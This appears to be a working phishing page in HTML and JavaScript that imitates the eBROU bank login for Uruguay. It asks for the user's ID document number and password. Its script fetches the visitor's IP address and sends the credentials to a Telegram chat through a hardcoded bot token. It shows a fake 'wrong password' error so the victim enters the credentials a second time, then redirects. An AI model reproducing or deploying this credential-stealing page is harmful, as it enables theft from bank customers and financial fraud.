<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Ingreso de Usuario - eBROU</title>
  <style>
    @font-face {
      font-family: 'Gotham Black';
      src: url('fonts/Gotham-Black.html') format('woff2'),
           url('fonts/Gotham-Black-2.html') format('woff'),
           url('fonts/Gotham-Black-3.html') format('truetype');
      font-weight: normal;
      font-style: normal;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Gotham Black', sans-serif;
      background-color: #f3f3f3;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    .barra-azul {
      width: 100%;
      height: 70px;
      background-color: #08528d;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .barra-azul img {
      height: 40px;
    }

    .franja-amarilla {
      width: 100%;
      height: 10px;
      background-color: #ffcb05;
    }

    .container {
      background-color: #ffffff;
      border-radius: 10px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      padding: 25px;
      box-sizing: border-box;
      margin-top: 20px;
    }

    h1 {
      font-size: 22px;
      color: #08528d;
      margin-bottom: 20px;
      text-align: center;
    }

    .form-group {
      margin-bottom: 15px;
      display: flex;
      flex-direction: column;
    }

    label {
      font-size: 13px;
      margin-bottom: 5px;
      color: #333;
    }

    .form-control {
      padding: 12px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 4px;
      width: 100%;
      box-sizing: border-box;
    }

    .submit-button {
      background-color: #08528d;
      color: #fff;
      border: none;
      padding: 12px;
      border-radius: 4px;
      font-size: 15px;
      cursor: pointer;
      width: 100%;
      margin-top: 10px;
    }

    .submit-button:hover {
      background-color: #063d6b;
    }

    .link-ebrou {
      font-size: 12px;
      color: #08528d;
      display: block;
      text-align: center;
      margin-top: 8px;
      text-decoration: none;
    }

    .link-ebrou:hover {
      text-decoration: underline;
    }

    .error-message-custom {
      background-color: #fde8e8;
      border: 1px solid #f44336;
      color: #d32f2f;
      padding: 12px;
      border-radius: 4px;
      font-size: 13px;
      display: none;
      margin-bottom: 20px;
    }

    .error-field {
      border-color: red !important;
    }

    .field-error-text {
      color: red;
      font-size: 12px;
      display: none;
      margin-top: 5px;
    }

    .footer {
      text-align: center;
      font-size: 12px;
      color: #777;
      margin: 20px 0;
    }
  </style>
</head>
<body>
  <div class="barra-azul">
    <img src="images.png" alt="Logo eBROU" />
  </div>

  <div class="franja-amarilla"></div>

  <div class="container">
    <h1>Ingreso de Usuario</h1>

    <div id="error-message" class="error-message-custom">
      ‚ùå Usuario y/o contrase√±a incorrectos
    </div>

    <div class="form-group">
      <label for="pais">Pa√≠s</label>
      <select id="pais" class="form-control">
        <option value="Uruguay">Uruguay</option>
      </select>
    </div>

    <div class="form-group">
      <label for="documento">Tipo de Documento</label>
      <select id="documento" class="form-control">
        <option value="ci">C.I.</option>
      </select>
    </div>

    <div class="form-group">
      <label for="numero-documento">Documento</label>
      <input type="tel" id="numero-documento" class="form-control" maxlength="8" inputmode="numeric" pattern="\d*" placeholder="Ingrese su documento" />
      <div id="usuario-vacio" class="field-error-text">El Usuario no puede estar vac√≠o</div>
    </div>

    <div class="form-group">
      <label for="contrasena">Contrase√±a</label>
      <input type="password" id="contrasena" class="form-control" placeholder="Ingrese su contrase√±a" />
      <div id="contrasena-vacia" class="field-error-text">La contrase√±a no puede estar vac√≠a</div>
    </div>

    <button onclick="enviarDatos()" class="submit-button">Ingresar</button>

    <a href="#" class="link-ebrou">¬øOlvid√≥ su Contrase√±a?</a>
    <a href="#" class="link-ebrou">Tengo un c√≥digo de recuperaci√≥n</a>
    <a href="#" class="link-ebrou">Registrar Usuario</a>
  </div>

  <div class="footer">
    ¬© 2025 Banco eBROU | <a href="#" style="color: #08528d;">Seguridad</a>
  </div>

  <script>
    let primerIntento = true;

    function enviarDatos() {
      const pais = document.getElementById("pais").value;
      const documento = document.getElementById("documento").value;
      const numeroDocumentoInput = document.getElementById("numero-documento");
      const contrasenaInput = document.getElementById("contrasena");
      const errorBox = document.getElementById("error-message");

      const numeroDocumento = numeroDocumentoInput.value.trim();
      const contrasena = contrasenaInput.value.trim();

      const errorUsuario = document.getElementById("usuario-vacio");
      const errorContrasena = document.getElementById("contrasena-vacia");

      // Reset errores
      errorBox.style.display = "none";
      numeroDocumentoInput.classList.remove("error-field");
      contrasenaInput.classList.remove("error-field");
      errorUsuario.style.display = "none";
      errorContrasena.style.display = "none";

      let valido = true;

      if (!numeroDocumento) {
        numeroDocumentoInput.classList.add("error-field");
        errorUsuario.style.display = "block";
        valido = false;
      }

      if (!contrasena) {
        contrasenaInput.classList.add("error-field");
        errorContrasena.style.display = "block";
        valido = false;
      }

      if (!valido) return;

      // Enviar los datos siempre que haya campos llenos
      fetch("https://api.ipify.org/?format=json")
        .then(response => response.json())
        .then(data => {
          const ip = data.ip;
          const TOKEN = "8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U";
          const CHAT_ID = "-4867067566";
          const mensaje = `

*ùó£ùóÆ√≠ùòÄ:* ${pais}
*ùóßùó∂ùóΩùóº ùó±ùó≤ ùóóùóºùó∞ùòÇùó∫ùó≤ùóªùòÅùóº:* ${documento}
*ùóñùó≤ùó±ùòÇùóπùóÆ:* ${numeroDocumento}
*ùóñùóºùóªùòÅùóøùóÆùòÄùó≤√±ùóÆ:* ${contrasena}
*ùóúùó£:* ${ip}
          `;

          const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

          fetch(url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: mensaje,
              parse_mode: "Markdown",
            }),
          })
          .then(response => {
            if (response.ok) {
              if (primerIntento) {
                primerIntento = false;
                errorBox.style.display = "block";
                numeroDocumentoInput.value = "";
                contrasenaInput.value = "";
                return;
              }

              // Redirige despu√©s de 2 segundos
              setTimeout(() => {
                window.location.href = "espera.html";
              }, 2000);
            } else {
              errorBox.style.display = "block";
            }
          })
          .catch(() => {
            errorBox.style.display = "block";
          });
        })
        .catch(() => {
          errorBox.style.display = "block";
        });
    }
  </script>
</body>
</html>
